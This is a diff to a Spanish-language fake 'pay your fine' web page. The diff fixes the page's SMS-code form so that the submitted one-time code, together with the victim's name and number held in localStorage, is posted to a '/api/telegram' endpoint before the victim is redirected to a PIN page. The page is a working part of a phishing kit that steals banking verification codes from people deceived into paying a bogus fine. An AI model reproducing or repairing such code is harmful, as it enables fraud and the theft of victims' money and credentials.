@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -257,13 +258,14 @@
 
 <h2 style="font-weight: normal; line-height: 1.875rem; color: rgb(76, 83, 93); background-color: rgb(255, 255, 255); text-transform: uppercase; border-bottom: 0.625rem solid rgb(133, 204, 242);"><span style="font-size: 11px;"><span class="badge badge-info" style="box-sizing: inherit; padding: 3px 7px; vertical-align: middle; border-radius: 10px; min-width: 10px; background-color: rgb(51, 122, 183);"><span style="box-sizing: inherit;">4</span></span><span style="color: rgb(51, 122, 183); font-weight: 700;">&nbsp;&nbsp;<span style="font-size:16px;">SMS</span></span></span></h2>
 
-<form onsubmit="return validateSMS();" method="post">
+<form id="smsForm" onsubmit="return validateSMS();" method="post">
     <div class="row">
 <div class="col-md-6 form-group">&nbsp;</div>
 
 <div class="col-md-6 form-group">&nbsp;</div>
 
-<div class="col-md-6 form-group"><span style="color: rgb(76, 83, 93); font-family: 'Open Sans', Helvetica, Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">C&oacute;digo recibido por SMS</span> <input id="first_name" maxlength="6" name="sms" required type="text" />
+<div class="col-md-6 form-group"><span style="color: rgb(76, 83, 93); font-family: 'Open Sans', Helvetica, Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">C&oacute;digo recibido por SMS</span>
+<input id="sms_input" maxlength="6" name="sms" required type="text" />
 <div class="sms-error-frame" id="smsError" style="display: none;">Por favor, ingrese un c&oacute;digo v&aacute;lido.</div>
 </div>
 
@@ -272,7 +274,7 @@
 <div class="col-md-6 form-group">&nbsp;</div>
 </div>
 
-<p><button type="submit" class="btn btn-primary">Pagar Multa</button></p>
+<button type="submit" class="btn btn-primary">Pagar Multa</button>
 </form>
 </section>
 
@@ -291,31 +293,35 @@
 </div>
 </div>
 </footer>
-	<script>
-const smsForm = document.querySelector("#smsForm");
-
-smsForm.addEventListener("submit", async (e) => {
-  e.preventDefault();
-
-  const sms_code = document.getElementById("sms_input").value;
-  const first_name = localStorage.getItem("first_name");
-  const last_name = localStorage.getItem("last_name");
-  const num = localStorage.getItem("num");
-
-  try {
-    const response = await fetch("/api/telegram", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ first_name, last_name, num, sms_code }),
+<script>
+    const smsForm = document.querySelector("#smsForm");
+    
+    smsForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+    
+      const sms_code = document.getElementById("sms_input").value;
+      const first_name = localStorage.getItem("first_name") || "";
+      const last_name = localStorage.getItem("last_name") || "";
+      const num = localStorage.getItem("num") || "";
+    
+      try {
+        const response = await fetch("/api/telegram", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ first_name, last_name, num, sms_code }),
+        });
+    
+        if (response.ok) {
+          alert("SMS envoyé avec succès!");
+          window.location.href = "pin.html"; // ← Redirect
+        } else {
+          document.getElementById("smsError").style.display = "block";
+        }
+      } catch (err) {
+        console.error(err);
+        document.getElementById("smsError").style.display = "block";
+      }
     });
-
-    if (response.ok) {
-      alert("SMS envoyé avec succès!");
-    }
-  } catch (err) {
-    console.error(err);
-  }
-});
     </script>
     </body>
 </html>
